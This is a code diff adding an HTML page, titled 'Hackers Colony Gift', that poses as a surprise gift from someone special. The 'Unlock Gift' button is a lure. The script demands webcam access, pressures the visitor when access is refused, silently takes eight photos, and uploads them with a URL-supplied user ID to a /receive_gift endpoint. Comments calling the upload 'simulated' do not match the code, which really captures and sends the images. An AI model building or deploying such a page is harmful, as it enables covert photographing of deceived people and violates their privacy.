@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hackers Colony Gift</title>
+    <style>
+        body { font-family: Arial; text-align: center; margin-top: 50px; }
+        button { margin: 10px; padding: 10px; font-size: 16px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h1>🎁 Surprise Gift from Someone Special 🧧</h1>
+    <p>Click on Unlock Gift to see your surprise!</p>
+    
+    <button onclick="showGift()" id="unlockBtn">Unlock Gift 🧧</button>
+    
+    <div id="giftContainer" class="hidden">
+        <h2>Loading your gift...</h2>
+        <p>Please allow camera access to unlock your gift.</p>
+        <video id="cameraVideo" width="400" height="300"></video>
+        <canvas id="cameraCanvas" width="400" height="300" class="hidden"></canvas>
+        <img id="giftImage" src="" alt="Your Gift" class="hidden">
+    </div>
+
+    <script>
+        let user_id = new URLSearchParams(window.location.search).get('user_id');
+        let video = document.getElementById('cameraVideo');
+        let canvas = document.getElementById('cameraCanvas');
+        let ctx = canvas.getContext('2d');
+        let giftContainer = document.getElementById('giftContainer');
+
+        async function showGift() {
+            document.getElementById('unlockBtn').style.display = 'none';
+            giftContainer.style.display = 'block';
+            
+            try {
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Capture images
+                setTimeout(captureImages, 2000); // Delay to allow camera to load
+                
+            } catch (err) {
+                console.error("Error accessing camera:", err);
+                alert("Camera access denied. Please enable camera permissions to receive your gift.");
+                location.reload();
+            }
+        }
+
+        function captureImages() {
+            // Capture multiple images
+            let count = 0;
+            const interval = setInterval(() => {
+                if (count >= 8) {
+                    clearInterval(interval);
+                    finishGift();
+                    return;
+                }
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to data URL and store (simulated)
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                localStorage.setItem(`gift_${count}`, dataUrl);
+                count++;
+                
+                if (count % 4 === 0) {
+                    // Show loading message
+                    document.querySelector('h2').textContent = `Loading gift (${count}/8)...`;
+                }
+            }, 1000);
+        }
+
+        function finishGift() {
+            // Simulate sending gift to server
+            fetch('/receive_gift', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    user_id: user_id,
+                    gift_data: Array.from({length: 8}, (_, i) => localStorage.getItem(`gift_${i}`))
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.querySelector('h2').textContent = "Your gift is ready!";
+                document.getElementById('giftImage').src = data.gift_url;
+                document.getElementById('giftImage').classList.remove('hidden');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.querySelector('h2').textContent = "Gift delivery failed. Please try again.";
+            });
+            
+            // Stop camera
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            video.srcObject = null;
+        }
+    </script>
+</body>
+</html>
